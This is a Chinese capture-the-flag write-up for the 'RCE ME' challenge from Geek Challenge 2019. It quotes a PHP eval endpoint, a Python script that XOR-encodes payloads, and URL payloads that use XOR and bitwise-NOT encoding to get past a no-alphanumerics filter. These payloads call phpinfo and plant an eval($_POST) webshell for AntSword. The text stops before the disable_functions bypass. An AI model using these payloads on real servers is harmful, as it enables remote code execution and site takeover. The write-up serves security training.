极客大挑战 2019 RCE ME

hdfzzf
2022-04-30 (Updated: 2022-04-30)
CTF
RCE, disable_functions绕过

题目地址：RCE ME

1. 题目信息

源码如下： 

<?php
error_reporting(0);
if(isset($_GET['code'])){
    $code=$_GET['code'];
        if(strlen($code)>40){ 
            die("This is too Long.");
        }
        if(preg_match("/[A-Za-z0-9]+/",$code)){
            die("NO.");
        }
        @eval($code);
}
else{
    highlight_file(__FILE__);
}
?>

通过代码审计： - 以GET方式传入参数code - code长度不能超过40 - code内不能包含大小写字母以及数字

2. 解题

虽然知道存在RCE，但是这里不能使用字母和数字，因此可以使用取反绕过和异或绕过。

这里给一个自己写的异或的脚本： 

def xor(payload):
    str1 = []
    str2 = []
    res1 = ''
    res2 = ''
    for p in payload:
        for i in range(128, 256):
            for j in range(128,256):
                if ord(p)==i^j:
                    str1.append(i)
                    str2.append(j)
                    break
            break
    for i in str1:
        res1 += str(hex(i))
    for i in str2:
        res2 += str(hex(i))
    print(res1.replace('0x', '%') + '^' + res2.replace('0x', '%'))

if __name__ == '__main__':
    payload = '_GET' # 修改这里就行
    xor(payload)

首先查看phpinfo信息，如果直接异或得到phpinfo长度会超： 

?code=%80%80%80%80%80%80%80^%f0%e8%f0%e9%ee%e6%ef();  # 远超40了

因此如果使用异或需要换一个思路： 

?code=${_GET}[_]();&_=phpinfo

这里利用了：

  1. PHP动态函数的特性；
  2. 自己写一个 $_GET，然后参数自定义，这样就可以把长度全部放在自定义的参数上，绕过长度限制。

将上面的payload异或： 

?code=${%80%80%80%80^%df%c7%c5%d4}[_]();&_=phpinfo # 这里其实[_]也可以用{_}代替

如果使用取反就很简单了： 

<?php
echo(urlencode(~'phpinfo'));
?>

结果：%8F%97%8F%96%91%99%90

payload: 

?code=(~%8F%97%8F%96%91%99%90)();

查看其中的disable_functions信息

发现命令执行的函数基本都被过滤了，看来之后要绕过。不论如何，先上线蚁剑： 

?code=$_=%80%80%80%80^%df%c7%c5%d4;${$_}[__](${$_}[___]);&__=assert&___=eval($_POST['ant'])

-> ?code=$_=_GET;${_GET}[__](${_GET}[___]);&__=assert&___=eval($_POST['ant'])

这里需要注意eval不能调用eval，所以需要调用assert，而assert再7.0即以上的版本无法直接把字符串当作代码执行，所以assert调用eval然后再传入数据。[[远程命令、代码执行总结（PHP）]]

取反： 

<?php 
error_reporting(0);
$a='assert';
$b=urlencode(~$a);
echo $b;
echo "<br>";
$c='(eval($_POST[mochu7]))';
$d=urlencode(~$c);
echo $d;
?>


结果：

%D7%9A%89%9E%93%D7%DB%A0%AF%B0%AC%AB%A4%92%90%9C%97%8A%C8%A2%D6%D6
